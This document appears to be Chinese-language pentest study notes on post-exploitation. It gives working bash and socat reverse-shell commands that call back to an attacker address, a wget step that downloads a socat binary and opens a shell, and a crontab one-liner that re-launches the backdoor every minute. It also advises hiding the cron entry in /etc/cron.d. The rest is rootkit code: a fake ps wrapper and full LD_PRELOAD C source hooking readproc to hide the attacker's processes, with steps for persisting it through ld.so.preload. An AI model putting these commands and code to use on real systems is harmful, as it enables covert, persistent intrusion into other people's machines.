## reverse shell

[reverse shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

開後門最直覺的作法就是開一個 shell 在受害者機器的某個 port 讓我們可以連進去，但是這樣可能會被防火牆擋住

所以反過來，在受害者機器上開一個 shell 連回我們的機器

!!! tip "reverse shell"
    ```bash
    # target machine
    bash -i >& /dev/tcp/192.168.100.100/9999 0>&1
    ```

    ```bash
    # hacker machine ( 192.168.100.100 )
    socat TCP-LISTEN:9999 -
    ```

??? failure "cannot create /dev/tcp/..."
    `sh` not support this feature, use `bash` instead
    ```bash
    # run the whole command inside bash
    bash -c "bash -i >& /dev/tcp/192.168.100.100/9999 0>&1"
    ```

## better reverse shell

參考這一篇 [Upgrading simple shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

!!! tip "python psuedo terminal"
    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```

!!! tip "socat"
    ```bash
    # target machine
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.100.100:9999
    ```

    ```bash
    # hacker machine ( 192.168.100.100 )
    socat file:`tty`,raw,echo=0 tcp-listen:9999
    ```

    ??? info "no socat install"
        如果受害者機器沒有安裝 socat 可以直接用 [socat standalone binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
        ```bash
        # target machine
        wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
        ```

## crontab

[crontab cheatsheet](https://devhints.io/cron)

拿到 shell 之後，可以把後門塞到 crontab 讓他每一段時間就跑一次後門

```bash
# reverse shell every minute
echo '*/1 * * * * bash -c "bash -i &> /dev/tcp/192.168.100.100/9999 0>&1"' | crontab
```

可以用 `crontab -l` 看目前使用者的所有排程

如果有 root 權限也可以考慮塞到 `/etc/cron.d`, `/etc/cron.hourly`, ...，這樣 `crontab -l` 就看不到了

## rootkit

rootkit 是隱藏其他程式的技術

### level 0

在 `$PATH` 環境變數中 `/usr/local/bin` 在 `/bin` 前面

所以我們可以寫一個檔案在 `/usr/local/bin/ps`

```bash
#!/bin/bash
/bin/ps $@ | grep -Ev '192.168.100.100|socat'
```

這樣就可以做到簡單的過濾字串了

* `grep -Ev` 是 inverse match
* `$@` 是傳進來的參數 ( 這裡原封不動的交給 `/bin/ps` )

### level 1 - LD_PRELOAD

#### 原始碼

```c linenums="1"
#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <proc/readproc.h>

int hidden (char *target) {
    char *keywords[2] = { "192.168.100.100", "socat" };
    for (int i = 0; i < 2; i++) if (strstr(target, keywords[i])) return 1;
    return 0;
}

proc_t* readproc (PROCTAB *PT, proc_t *return_buf) {
    typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, "readproc");
    proc_t* ret_value = old_readproc(PT, return_buf);
    while (ret_value
        && ret_value->cmdline
        && hidden(ret_value->cmdline[0])) {
        ret_value = old_readproc(PT, return_buf);
    }
    return ret_value;
}
```

#### 解釋

首先我們可以用 `ltrace` 看 `ps` 跑起來會呼叫什麼 library 的函式  

```c
...
fwrite(" [jfsCommit]\nhe]\n4\n0\n\nstart\ngrou"..., 13, 1, 0x7fbfcd303760)  = 1
readproc(0x55e061b12f90, 0x55e0609d1540, 13, 1024)                          = 0x55e0609d1540
escape_str(0x7fbfcd90b090, 0x55e0609d1740, 0x20000, 0x7fff6f748044)         = 4
strlen("root")                                                              = 4
fwrite("root", 4, 1, 0x7fbfcd303760)                                        = 1
...
```

然後會發現 `readproc` 一直出現  
`man` 是這樣介紹這個函式的 : `read information from next /proc/## entry`  
在 `ps` 的原始碼中查了一下

??? info "如何取得 ps 原始碼"
    `ps` 這個指令是來自 `procps`，可以從 [procps.sourceforge.net](http://procps.sourceforge.net/) 下載  
    另外其他基本的 shell 指令的原始碼可以從 [www.gnu.org/software/coreutils](https://www.gnu.org/software/coreutils/) 下載

```c linenums="331" tab="procps-3.2.8/ps/display.c"
  ptp = openproc(needs_for_format | needs_for_sort | needs_for_select | needs_for_threads);
  if(!ptp) {
    fprintf(stderr, "Error: can not access /proc.\n");
    exit(1);
  }
  memset(&buf, '#', sizeof(proc_t));
  switch(thread_flags & (TF_show_proc|TF_loose_tasks|TF_show_task)){
  case TF_show_proc:                   // normal non-thread output
    while(readproc(ptp,&buf)){}}
```

基本上就是 `openproc` 然後再用 `readproc` 一次讀一個 process entry  
`ptp` 的型態是 [`PROCTAB*`](https://fossies.org/dox/procps-3.2.8/structPROCTAB.html)，讓程式能找到下一個 process  
`buf` 的型態是 [`proc_t*`](https://fossies.org/dox/procps-3.2.8/structproc__t.html)，包含了 process 的資訊  
那我們就去 hijack `readproc` 這個函式，看到想隱藏的 procss 就跳過它

```c linenums="13"
    typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, "readproc");
```

這行是 `LD_PRELOAD` 技巧的關鍵，用 `dlsym` 這個 function 找回原本的函式  
`typeof(readproc)` 只是一個語法糖，代表 `readproc` 這個 function pointer 的型態 ( 這樣就不用再打一次了 )

```c linenums="14"
    proc_t* ret_value = old_readproc(PT, return_buf);
    while (ret_value
        && ret_value->cmdline
        && hidden(ret_value->cmdline[0])) {
        ret_value = old_readproc(PT, return_buf);
    }
```

先正常讀一個 procss entry，檢查 cmdline 有沒有我們想要隱藏的 process  
有的話就再呼叫一次 `old_readproc` 讀下一個 process

#### 編譯

```bash
gcc -fPIC -shared -o hook.so hook.c
```

#### 執行

###### LD_PRELOAD

只有該次執行會載入

```bash
LD_PRELOAD=/path/to/hook.so ps aux
```

###### ld.so.preload

編輯 `ld.so.preload`，寫入 `hook.so` 的路徑，之後每次執行都會載入

```
/path/to/hook.so
```

可以用 `ldd` 查看是否成功 preload

<img src="https://i.imgur.com/pyGjG1j.png" width="700">

### level 2 - Kernel Module

**==TODO==**

[^1]:
	https://unix.stackexchange.com/questions/417323/what-is-the-difference-between-cron-d-as-in-etc-cron-d-and-crontab
[^2]:
	https://ubuntuforums.org/showthread.php?t=1656623
[^3]:
	http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/
